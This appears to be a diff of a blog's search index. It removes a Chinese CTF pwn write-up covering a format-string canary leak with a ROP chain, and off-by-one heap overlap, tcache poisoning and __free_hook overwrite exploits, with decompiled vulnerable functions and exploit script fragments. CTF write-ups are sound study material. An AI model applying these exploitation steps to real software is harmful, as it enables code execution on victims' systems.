@@ -4,19 +4,6 @@
   
     
     <entry>
-      <title>十月二十六日-拟态-PWN</title>
-      <link href="2021/10/26/10.24%E6%8B%9F%E6%80%81/"/>
-      <url>2021/10/26/10.24%E6%8B%9F%E6%80%81/</url>
-      
-        <content type="html"><![CDATA[<h1 id="pwnpwn"><a href="#pwnpwn" class="headerlink" title="pwnpwn"></a>pwnpwn</h1><p>简单的格式化字符串漏洞由于程序本身会打印一个当前地址，只需要减去当前函数的偏移即可获取elf基地址</p><p>通过格式化字符串漏洞泄露canary</p><p>最后用ROPgadget寻找可用gadget，用ret,劫持执行流，pop rdi ；ret传参”bin/sh”,再进入system函数</p><h1 id="bitfile"><a href="#bitfile" class="headerlink" title="bitfile"></a>bitfile</h1><p>漏洞出现在edit中，因为在读入时多出了一个字符，所以造成了off-by-one 漏洞。</p><pre><code>  v7 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1054, &amp;v6);  v0 = v6;  if ( v6 &lt;= 0x1F )  &#123;    if ( ptrs[v6] )    &#123;      __printf_chk(1LL, &quot;Content: &quot;);      v1 = sizes[v0];      v2 = (_BYTE *)ptrs[v0];      max_size = v1 + 1;      if ( max_size )      &#123;        v4 = &amp;v2[max_size];        do        &#123;          read(0, v2, 1uLL);          if ( *v2 == 10 )            break;          ++v2;        &#125;        while ( v2 != v4 );      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ v7;&#125;</code></pre><p>又因为在add函数中限制了chunk的大小，所以我们要通过合并堆从而泄露libc.</p><pre><code>unsigned __int64 add()&#123;  size_t v0; // rbx  size_t size_; // rbp  void *v3; // rax  size_t size; // [rsp+0h] [rbp+0h] BYREF  unsigned __int64 vars8; // [rsp+8h] [rbp+8h]  vars8 = __readfsqword(0x28u);  __printf_chk(1LL, &quot;Index: &quot;);  __isoc99_scanf(&amp;unk_1054, &amp;size);  v0 = size;  if ( size &lt;= 0x1F &amp;&amp; !ptrs[size] )  &#123;    __printf_chk(1LL, &quot;Size: &quot;);    __isoc99_scanf(&amp;unk_1054, &amp;size);    size_ = size;    if ( size &lt;= 0x50 )    &#123;      v3 = malloc(size);      if ( v3 )      &#123;        ptrs[v0] = v3;        sizes[v0] = size_;        puts(&quot;Done!&quot;);      &#125;      else      &#123;        puts(&quot;allocate failed&quot;);      &#125;    &#125;  &#125;  return __readfsqword(0x28u) ^ vars8;&#125;</code></pre><p>在布置完一系列的堆后，先利用tcache_bin打印出tcache的地址。为之后的堆重叠做好了准备</p><pre><code>rm(0)md(2,b&#39;A&#39; * 0x48 + p8(0x50 + 0x51))gdb.attach(io)rm(4)              #chunk 3 is 0xa1 ;#gdb.attach(io)ad(0, 0x48)dp(0)ru(&#39;Content: &#39;)leak = u64(ru(&#39;\n&#39;).ljust(8, b&#39;\x00&#39;))  #tcache addrheap = leak - 0x260 + 0x10 + 8   #to chunk first</code></pre><p><img src="https://i.loli.net/2021/10/25/6cjeDorwbLNGY8Z.png"></p><p>free(3)之后合并形成了size为0xa1的堆块，利用溢出修改chunk(6)的size然后free(6)  free(7)  这样就形成了一个堆重叠的结构。修改（7）的fd指向tcache_strcuct</p><p>设置为7，是释放0xa0大小的chunk时，不由tcache bin进行回收 而是有unsorted bin来管理</p><pre><code>rm(3)#gdb.attach(io)rm(11) # make 0x50 more lengmd(5,b&#39;B&#39; * 0x28 + p8(0x30 + 0x31))rm(6)rm(7)ad(6, 0x50)md(6, b&#39;A&#39; * 0x28 + p64(0x31) + p64(heap) + b&#39;\n&#39;) ad(3, 0x28)ad(4, 0x28)      #018md(4, p64(7) + b&#39;\n&#39;) # set 0xa0 chunk number as 7#gdb.attach(io)md(8,b&#39;C&#39; * 0x48 + p8(0x50 + 0x51))rm(9)#gdb.attach(io)ad(9, 0x38)dp(9)</code></pre><p>泄露libc， 将chunk(9)的size改为0xa1,形成unsortbin,然后再次malloc，通过打印，并计算出libc基址</p><pre><code>md(8,b&#39;C&#39; * 0x48 + p8(0x50 + 0x51))rm(9)ad(9, 0x38)dp(9)leak = u64(ru(&#39;\x7f&#39;)[-5:] + b&#39;\x7f\x00\x00&#39;)     #libc_base-getlibc_base = leak  - libc.sym[&#39;__malloc_hook&#39;] - 240 - 0x10li(&#39;leak: &#39; + hex(leak))li(&#39;libc_base: &#39; + hex(libc_base)) </code></pre><p>get_shell</p><p>通过同样的方式，溢出修改(13)的size,free(13) free(14)形成堆重叠，再malloc一个chunk使得可以修改(14)的fd 为 __free_hook ，再进行malloc，向__free_hook中写入system 。顺便将一个chunk写入(“/bin/sh\x00”),将其free即可</p><h1 id="old-school-amp-amp-old-school-revenge"><a href="#old-school-amp-amp-old-school-revenge" class="headerlink" title="old_school &amp;&amp; old_school_revenge"></a>old_school &amp;&amp; old_school_revenge</h1><p><img src="https://i.loli.net/2021/10/27/nPBoMijyCeAUf18.png"></p><p>依然是一个off-by-one,但是限制了大小，所以我们需要通过合并堆来形成unsortbin ，从而泄露libc</p><p>先创建若干堆，然后free掉7个填充满tchack</p><pre><code>for i in range(7):    ad(i,0x80)ad(7,0x80)ad(8,0x78)ad(9,0x78)ad(10,0x80)ad(11,0x70)ad(12,0x70)for i in range(7):    rm(i)</code></pre><p>利用chunk(9)来修改chunk(10)的pre_size，然后free(7),free(10)，从而使得7–&gt;10进行合并，之后可以切割unsortbin来进行泄露。</p><p><img src="https://i.loli.net/2021/10/27/8fvnKSTLab9ZCw6.png"></p><pre><code>md(9, &#39;A&#39; * 0x70 + p64(0x90 + 0x80 + 0x80) + &#39;\x90&#39;)rm(9)rm(10)ad(0, 0x60) ad(1, 0x10) dp(8)leak = u64(ru(&#39;\x7f&#39;)[-5:] + &#39;\x7f\x00\x00&#39;)libc_base = leak  - libc.sym[&#39;__malloc_hook&#39;] - 96 - 0x10</code></pre><p>由于之前我们的chunk结构，所以我们选择在chunk(8),chunk(9)进行写入unsortbin。<br>因为chunk(8)的大小为0x78，为了溢出至chunk(9)，我们需要malloc一个大chunk,从而可以修改到chunk(9)的FD</p><p>malloc后，往该堆填入数据直到chunk(9)的FD,写入__free_hook.</p><pre><code>ad(2,0xa0)payload = b&#39;B&#39;*0x80 + p64(__free_hook)+ p64(0) + b&#39;\n&#39;md(2,payload)#gdb.attach(io)ad(4,0x70)md(4,&#39;/bin/sh\x00\n&#39;)ad(5,0x70)md(5,p64(system)+b&#39;\n&#39;)rm(4)</code></pre><p>之后就按照流程进入system即可。</p>]]></content>
-      
-      
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>十月一日-CTF-PWN</title>
       <link href="2021/10/03/10.1/"/>
       <url>2021/10/03/10.1/</url>
@@ -43,7 +30,7 @@
     
     
     <entry>
-      <title>buuctf&amp;&amp;攻防世界_Num2</title>
+      <title>buuctf&amp;&amp;攻防世界2</title>
       <link href="2021/08/04/A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn(2)/"/>
       <url>2021/08/04/A%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn(2)/</url>
       
